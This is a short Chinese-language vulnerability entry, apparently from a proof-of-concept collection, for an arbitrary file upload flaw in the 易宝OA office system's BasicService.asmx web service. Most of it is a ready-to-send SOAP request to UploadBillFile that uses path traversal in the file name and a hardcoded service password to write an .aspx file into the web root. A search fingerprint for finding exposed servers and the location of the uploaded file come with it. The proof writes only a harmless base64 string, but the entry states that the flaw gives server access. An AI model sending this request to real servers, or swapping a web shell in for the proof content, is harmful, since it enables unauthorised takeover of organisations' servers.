﻿# 易宝OA-BasicService.asmx 任意文件上传漏洞

> 更新时间：2024-03-28

> 漏洞编号：

> 漏洞说明：易宝OA是一款非常强大的手机办公软件，这里不仅为广大的用户提供了一个更好的工作日历，而且每个人都可以在这里进行重要事项的记录，同时软件中还拥有更好的打卡系统，让用户可以快速记录自己的工作时常，而且调班与补卡也会更加的简单，让你工作活跃度得到提升。易宝OA-BasicService.asmx存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

> 漏洞特征：title="欢迎登录易宝OA系统"

> 验证脚本：HTTP

```
POST /WebService/BasicService.asmx HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
SOAPAction: http://tempuri.org/UploadBillFile
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:UploadBillFile>
         <!--type: base64Binary-->
         <tem:fs>aGVsbG8K</tem:fs>
         <!--type: string-->
         <tem:FileName>../../manager/dudesite.aspx</tem:FileName>
         <!--type: string-->
         <tem:webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</tem:webservicePassword>
      </tem:UploadBillFile>
   </soapenv:Body>
</soapenv:Envelope>
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/dudesite.aspx

> 验证文件来源：易宝OA-BasicService.asmx 任意文件上传漏洞.poc

